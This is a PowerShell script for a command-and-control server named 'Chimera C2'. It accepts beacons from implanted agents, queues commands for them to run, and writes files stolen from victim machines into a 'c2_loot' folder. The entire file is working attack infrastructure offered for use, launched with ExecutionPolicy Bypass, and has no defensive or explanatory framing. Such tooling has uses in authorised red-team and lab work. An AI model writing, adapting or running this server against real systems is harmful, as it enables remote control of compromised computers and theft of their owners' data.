# Chimera C2 server - blocking GetContext on background thread
# Usage: powershell -ExecutionPolicy Bypass -File c2server.ps1

param(
    [string]$Bind     = "http://127.0.0.1:8080/",
    [string]$LootDir  = "C:\Users\Public\c2_loot",
    [string]$TaskFile = "C:\Temp\c2task.txt"
)

Set-StrictMode -Off
$ErrorActionPreference = "Continue"
New-Item -ItemType Directory -Force -Path $LootDir | Out-Null
New-Item -ItemType Directory -Force -Path "C:\Temp"  | Out-Null

$script:AgentUUID = $null

function New-TID { [System.Guid]::NewGuid().ToString("N").Substring(0,16) }

function Decode($raw) {
    try {
        $b = [System.Convert]::FromBase64String($raw.Trim())
        if ($b.Length -gt 36) { return [System.Text.Encoding]::UTF8.GetString($b, 36, $b.Length - 36) }
    } catch {}
    return $raw
}

function Wrap($json) {
    $uuid = "aabbccdd-aabb-aabb-aabb-aabbccddeeff"
    $ub = [System.Text.Encoding]::UTF8.GetBytes($uuid)
    $jb = [System.Text.Encoding]::UTF8.GetBytes($json)
    $c  = New-Object byte[]($ub.Length + $jb.Length)
    [Array]::Copy($ub,0,$c,0,$ub.Length)
    [Array]::Copy($jb,0,$c,$ub.Length,$jb.Length)
    return [System.Convert]::ToBase64String($c)
}

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add($Bind)
$listener.Start()
Write-Host "[C2] Listening on $Bind"
Write-Host "[C2] Task queue:  Set-Content $TaskFile 'command params'"
Write-Host "[C2] Press Ctrl+C to stop"
Write-Host ""

# Handle requests on a background thread so the main thread can read console
$listenerRef = $listener
$http_thread = [System.Threading.Thread]::new({
    param($l, $ld, $tf)
    while ($l.IsListening) {
        try {
            $ctx  = $l.GetContext()
            $req  = $ctx.Request
            $resp = $ctx.Response
            $ts   = (Get-Date).ToString("HH:mm:ss")

            $ms = New-Object System.IO.MemoryStream
            if ($req.HasEntityBody) { $req.InputStream.CopyTo($ms) }
            $raw  = [System.Text.Encoding]::UTF8.GetString($ms.ToArray())
            $body = & {
                try {
                    $b = [System.Convert]::FromBase64String($raw.Trim())
                    if ($b.Length -gt 36) { return [System.Text.Encoding]::UTF8.GetString($b,36,$b.Length-36) }
                } catch {}
                return $raw
            }

            $uuid = "aabbccdd-aabb-aabb-aabb-aabbccddeeff"
            $replyJson = "{}"

            if ($body -match '"action"\s*:\s*"checkin"') {
                if ($body -match '"uuid"\s*:\s*"([^"]+)"') { $script:AgentUUID = $Matches[1] }
                elseif (-not $script:AgentUUID) { $script:AgentUUID = [System.Guid]::NewGuid().ToString() }
                $replyJson = '{"action":"checkin","id":"' + $script:AgentUUID + '","tasks":[]}'
                [Console]::WriteLine("[$ts] >>> CHECKIN  agent=$($script:AgentUUID)")

            } elseif ($body -match '"action"\s*:\s*"get_tasking"') {
                $tasks = "[]"
                if (Test-Path $tf) {
                    $fc = (Get-Content $tf -Raw).Trim()
                    Remove-Item $tf -Force -ErrorAction SilentlyContinue
                    if ($fc -match '^(\S+)\s*(.*)$') {
                        $tc=$Matches[1]; $tp=$Matches[2].Trim(); $tid=[System.Guid]::NewGuid().ToString("N").Substring(0,16)
                        $safe=$tp -replace '\\','\\' -replace '"','\"'
                        $tasks='[{"id":"'+$tid+'","command":"'+$tc+'","parameters":"'+$safe+'"}]'
                        [Console]::WriteLine("[$ts] >>> TASK: $tc [$tp]")
                    }
                } else {
                    [Console]::WriteLine("[$ts]     beacon (idle)")
                }
                $replyJson = '{"action":"get_tasking","tasks":' + $tasks + '}'

            } elseif ($body -match '"action"\s*:\s*"post_response"') {
                if ($body -match '"download"') {
                    $fname = "loot_$((Get-Date).ToString('HHmmss')).bin"
                    if ($body -match '"full_path"\s*:\s*"([^"]+)"') { $fname = [System.IO.Path]::GetFileName(($Matches[1] -replace '\\\\','\')) }
                    if ($body -match '"chunk_data"\s*:\s*"([A-Za-z0-9+/=]+)"') {
                        $data = [System.Convert]::FromBase64String($Matches[1])
                        $out  = [System.IO.Path]::Combine($ld, $fname)
                        [System.IO.File]::WriteAllBytes($out, $data)
                        [Console]::WriteLine("[$ts] <<< FILE: $fname  ($([int]($data.Length/1024)) KB) -> $out")
                    }
                } else {
                    if ($body -match '"output"\s*:\s*"((?:[^"\\]|\\.)*)"') {
                        $out = $Matches[1] -replace '\\n',"`n" -replace '\\"','"'
                        [Console]::WriteLine("[$ts] <<< OUTPUT:`n$out`n")
                    } else {
                        [Console]::WriteLine("[$ts] <<< post_response")
                    }
                }
                $replyJson = '{"action":"post_response","responses":[]}'

            } else {
                [Console]::WriteLine("[$ts] <<< unknown ($($body.Length) chars)")
            }

            # Wrap and send
            $ub2 = [System.Text.Encoding]::UTF8.GetBytes($uuid)
            $jb2 = [System.Text.Encoding]::UTF8.GetBytes($replyJson)
            $c2  = New-Object byte[]($ub2.Length+$jb2.Length)
            [Array]::Copy($ub2,0,$c2,0,$ub2.Length); [Array]::Copy($jb2,0,$c2,$ub2.Length,$jb2.Length)
            $rb  = [System.Text.Encoding]::UTF8.GetBytes([System.Convert]::ToBase64String($c2))
            $resp.ContentType = "application/json"
            $resp.ContentLength64 = $rb.Length
            $resp.OutputStream.Write($rb,0,$rb.Length)
            $resp.Close()

        } catch [System.Net.HttpListenerException] {
            break
        } catch {
            [Console]::WriteLine("[ERR] $_")
            try { $ctx.Response.Close() } catch {}
        }
    }
})
$http_thread.IsBackground = $true
$http_thread.Start($listener, $LootDir, $TaskFile)

# Main thread: just keep alive until Ctrl+C
try {
    while ($listener.IsListening) { Start-Sleep -Seconds 1 }
} finally {
    $listener.Stop()
    Write-Host "[C2] Stopped."
}
